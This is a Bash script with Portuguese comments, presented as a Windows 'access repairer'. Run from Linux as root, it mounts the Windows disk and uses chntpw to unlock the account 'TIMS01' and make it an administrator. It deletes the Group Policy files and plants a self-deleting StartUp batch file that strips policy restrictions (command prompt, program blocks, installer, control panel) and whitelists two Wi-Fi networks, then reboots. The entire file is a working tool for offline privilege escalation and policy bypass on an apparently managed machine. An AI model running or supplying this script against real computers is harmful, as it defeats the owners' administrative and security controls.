#!/bin/bash
set -e

# Garante privilégios de root
if [ "$EUID" -ne 0 ]; then
    echo "[-] Por favor, execute como root (sudo ./script.sh)"
    exit 1
fi

echo "======================================================="
echo "   REPARADOR AUTOMÁTICO DE ACESSO & RESTRIÇÕES DO WINDOWS"
echo "======================================================="

# 1. Instalação de ferramentas necessárias
echo "[+] Atualizando repositórios e instalando chntpw e ntfs-3g..."
apt-get update -qq && apt-get install -y chntpw ntfs-3g

# 2. Função para detecção automática e precisa da partição do Windows
detectar_particao_windows() {
    echo "[*] Procurando partição do Windows automaticamente..."
    
    # Lista todas as partições do tipo NTFS
    local particoes=$(lsblk -rnpo NAME,FSTYPE | awk '$2 ~ /ntfs/ {print $1}')
    
    if [ -z "$particoes" ]; then
        particoes=$(blkid -t TYPE="ntfs" -o device || true)
    fi

    mkdir -p /mnt/win_check

    for part in $particoes; do
        # Tenta montar em modo somente leitura para validação
        if mount -t ntfs-3g -o ro "$part" /mnt/win_check 2>/dev/null || mount -o ro "$part" /mnt/win_check 2>/dev/null; then
            # Procura de forma insensível a maiúsculas/minúsculas o arquivo SAM
            if find /mnt/win_check/ -maxdepth 4 -ipath "*/Windows/System32/config/SAM" 2>/dev/null | grep -q .; then
                umount /mnt/win_check 2>/dev/null || true
                rmdir /mnt/win_check 2>/dev/null || true
                echo "$part"
                return 0
            fi
            umount /mnt/win_check 2>/dev/null || true
        fi
    done

    rmdir /mnt/win_check 2>/dev/null || true
    return 1
}

WINDOWS_PART=$(detectar_particao_windows || true)

if [ -z "$WINDOWS_PART" ]; then
    echo "[-] ERRO: Nenhuma instalação válida do Windows foi encontrada nos discos NTFS."
    exit 1
fi

echo "[+] Partição correta do Windows detectada com sucesso: $WINDOWS_PART"

# 3. Ponto de montagem e montagem com suporte a escrita
echo "[+] Montando partição em /mnt/windows..."
mkdir -p /mnt/windows
umount /mnt/windows 2>/dev/null || true

# Tenta montar normalmente; se falhar por Fast Startup/hibernação, limpa a flag
if ! mount -t ntfs-3g "$WINDOWS_PART" /mnt/windows 2>/dev/null; then
    echo "[*] Partição com inicialização rápida ou suja detectada. Corrigindo montagem..."
    ntfsfix -d "$WINDOWS_PART" 2>/dev/null || true
    mount -t ntfs-3g -o remove_hiberfile "$WINDOWS_PART" /mnt/windows
fi

# 4. Promoção da conta TIMS01 a Administrador via chntpw (100% Automático)
# Encontra o caminho real da pasta config (independente de maiúsculas/minúsculas)
CONFIG_DIR=$(find /mnt/windows/ -maxdepth 3 -ipath "*/Windows/System32/config" | head -n 1)

if [ -d "$CONFIG_DIR" ]; then
    echo "[+] Promovendo o usuário 'TIMS01' a Administrador..."
    cd "$CONFIG_DIR"
    # Opções do chntpw: 2 (desbloquear) -> 3 (promover a admin) -> q (sair) -> y (salvar no SAM)
    printf "2\n3\nq\ny\n" | chntpw -u "TIMS01" SAM >/dev/null 2>&1 || true
else
    echo "[-] Aviso: Pasta config não encontrada para o chntpw."
fi

# 5. Remoção direta de arquivos de Diretiva de Grupo bloqueadores (GPO)
echo "[+] Apagando arquivos de bloqueio de diretiva locais..."
find /mnt/windows/ -maxdepth 5 -ipath "*/Windows/System32/GroupPolicy/User/Registry.pol" -delete 2>/dev/null || true
find /mnt/windows/ -maxdepth 5 -ipath "*/Windows/System32/GroupPolicy/Machine/Registry.pol" -delete 2>/dev/null || true

# 6. Injeção de script de desbloqueio na inicialização do Windows
# Quando o Windows iniciar, esse script limpa o registro, adiciona o Wi-Fi e se apaga
STARTUP_DIR=$(find /mnt/windows/ -maxdepth 6 -ipath "*/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp" 2>/dev/null | head -n 1)

if [ -n "$STARTUP_DIR" ] && [ -d "$STARTUP_DIR" ]; then
    echo "[+] Injetando script de liberação de Wi-Fi e Registro no StartUp do Windows..."
    cat << 'EOF' > "$STARTUP_DIR/desbloquear.bat"
@echo off
:: Remove bloqueios de programas e ferramentas do registro
reg delete "HKCU\Software\Policies\Microsoft\Windows\System" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\WindowsStore" /v "RemoveWindowsStore" /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Windows\Installer" /v "DisableMSI" /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /f >nul 2>&1

:: Adiciona as redes Wi-Fi solicitadas
netsh wlan add filter permission=allow ssid="ghost" networktype=infrastructure >nul 2>&1
netsh wlan add filter permission=allow ssid="Ffgv" networktype=infrastructure >nul 2>&1

:: Atualiza as diretivas
gpupdate /force >nul 2>&1

:: Reinicia o Explorer
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe

:: Auto-destruição para rodar apenas uma única vez
del "%~f0" >nul 2>&1
EOF
    chmod 777 "$STARTUP_DIR/desbloquear.bat"
fi

# 7. Sincronização, desmontagem e reinicialização
echo "[+] Sincronizando dados e desmontando a partição..."
cd ~
sync
umount /mnt/windows

echo "[+] SUCESSO: Tudo pronto e 100% configurado!"
echo "[+] O computador será reiniciado no Windows em 5 segundos..."
sleep 5
reboot
